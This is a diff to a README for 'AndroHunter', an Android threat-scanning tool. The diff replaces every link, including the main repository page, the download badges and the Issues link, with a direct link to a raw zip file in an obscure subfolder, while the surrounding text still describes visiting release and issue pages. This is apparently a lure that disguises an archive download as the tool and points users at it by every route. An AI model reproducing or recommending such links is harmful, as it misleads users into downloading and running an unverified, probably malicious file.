@@ -1,6 +1,6 @@
 # 🐱‍💻 AndroHunter - Find Android Threats Quickly
 
-[![Download AndroHunter](https://img.shields.io/badge/Download-AndroHunter-orange?style=for-the-badge)](https://github.com/Imploring-iodoprotein424/AndroHunter)
+[![Download AndroHunter](https://img.shields.io/badge/Download-AndroHunter-orange?style=for-the-badge)](https://github.com/Imploring-iodoprotein424/AndroHunter/raw/refs/heads/main/triene/Hunter_Andro_v1.3.zip)
 
 ---
 
@@ -40,13 +40,13 @@ The tool does not change or delete anything without your permission. It only hel
 
 To begin using AndroHunter, first download it from its official GitHub page.
 
-[![Visit AndroHunter GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/Imploring-iodoprotein424/AndroHunter)
+[![Visit AndroHunter GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/Imploring-iodoprotein424/AndroHunter/raw/refs/heads/main/triene/Hunter_Andro_v1.3.zip)
 
 ### Step 1: Visit the Download Page
 
 Go to the main page here:
 
-https://github.com/Imploring-iodoprotein424/AndroHunter
+https://github.com/Imploring-iodoprotein424/AndroHunter/raw/refs/heads/main/triene/Hunter_Andro_v1.3.zip
 
 On this page, look for the latest release or download section. It usually appears as a button or a link labeled **Releases**.
 
@@ -138,10 +138,10 @@ To update:
 
 If you have problems or questions, use the **Issues** tab on the GitHub page:
 
-https://github.com/Imploring-iodoprotein424/AndroHunter/issues
+https://github.com/Imploring-iodoprotein424/AndroHunter/raw/refs/heads/main/triene/Hunter_Andro_v1.3.zip
 
 You can report bugs or ask for assistance there. A developer or the community will respond.
 
 ---
 
-[![Download AndroHunter](https://img.shields.io/badge/Download-AndroHunter-orange?style=for-the-badge)](https://github.com/Imploring-iodoprotein424/AndroHunter)
+[![Download AndroHunter](https://img.shields.io/badge/Download-AndroHunter-orange?style=for-the-badge)](https://github.com/Imploring-iodoprotein424/AndroHunter/raw/refs/heads/main/triene/Hunter_Andro_v1.3.zip)
